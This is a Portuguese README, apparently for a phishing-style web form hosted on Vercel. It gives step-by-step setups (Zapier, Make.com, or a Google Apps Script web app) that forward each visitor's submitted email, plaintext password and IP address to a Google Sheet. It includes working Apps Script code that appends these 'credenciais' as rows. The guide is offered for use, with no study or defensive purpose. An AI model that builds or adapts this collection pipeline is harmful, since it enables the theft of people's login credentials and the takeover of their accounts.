# 🚀 Solução Simples - Google Sheets

A forma **MAIS SIMPLES** de fazer as credenciais chegarem no Google Sheets!

## ✨ Opção 1: Zapier (Recomendado - 2 minutos)

1. Crie conta grátis em: https://zapier.com
2. Crie um novo Zap:
   - **Trigger:** Webhooks by Zapier → Catch Hook
   - Copie a URL do webhook
3. Na Vercel, adicione variável:
   - `WEBHOOK_URL` = URL do Zapier
4. No Zapier:
   - **Action:** Google Sheets → Create Spreadsheet Row
   - Conecte sua conta Google
   - Selecione sua planilha
   - Mapeie os campos:
     - Timestamp → Coluna A
     - email → Coluna B  
     - password → Coluna C
     - ip → Coluna D
5. Ative o Zap!

**Pronto!** Agora quando alguém preencher, vai direto pro Sheets! 🎉

---

## ✨ Opção 2: Make.com (Gratuito também)

1. Crie conta em: https://make.com
2. Crie um cenário:
   - **Trigger:** Webhook → Custom webhook
   - Copie a URL
3. Na Vercel, adicione: `WEBHOOK_URL` = URL do Make
4. Adicione módulo: Google Sheets → Add a row
5. Configure e ative!

---

## ✨ Opção 3: Google Apps Script (Gratuito, sem serviços externos)

1. Abra sua planilha
2. Vá em **Extensões** → **Apps Script**
3. Cole este código:

```javascript
function doPost(e) {
  const sheet = SpreadsheetApp.getActiveSpreadsheet().getActiveSheet();
  const data = JSON.parse(e.postData.contents);
  
  sheet.appendRow([
    data.timestamp || new Date(),
    data.email,
    data.password,
    data.ip
  ]);
  
  return ContentService.createTextOutput(JSON.stringify({success: true}));
}
```

4. Salve e publique como **Web App**
5. Copie a URL do web app
6. Na Vercel, adicione: `WEBHOOK_URL` = URL do Apps Script

---

## ⚙️ Configuração na Vercel

Qualquer opção que escolher, só precisa adicionar:

1. Vá em **Settings** → **Environment Variables**
2. Adicione:
   - **Nome:** `WEBHOOK_URL`
   - **Valor:** URL do webhook (Zapier/Make/Apps Script)
3. Salve e faça redeploy

## ✅ Testar

Preencha o formulário e veja a mágica acontecer! ✨

---

## 🎯 Qual escolher?

- **Zapier:** Mais fácil, interface visual, 100 tarefas/mês grátis
- **Make.com:** Similar ao Zapier, também grátis
- **Apps Script:** Totalmente grátis, sem limites, mas precisa de código

**Recomendação:** Zapier é o mais simples! 🚀
